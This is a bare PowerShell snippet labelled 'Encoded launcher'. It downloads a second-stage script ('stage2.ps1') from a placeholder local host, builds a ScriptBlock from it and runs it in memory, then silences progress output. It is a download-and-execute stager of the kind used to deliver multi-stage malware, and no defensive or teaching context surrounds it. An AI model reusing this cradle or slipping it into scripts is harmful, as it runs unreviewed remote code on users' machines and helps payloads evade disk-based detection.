# Encoded launcher
$RemoteScript = (iwr 'https://localhost:8081/stage2.ps1' -UseBasicParsing).Content
[ScriptBlock]::Create($RemoteScript).Invoke()
$ProgressPreference = "SilentlyContinue"
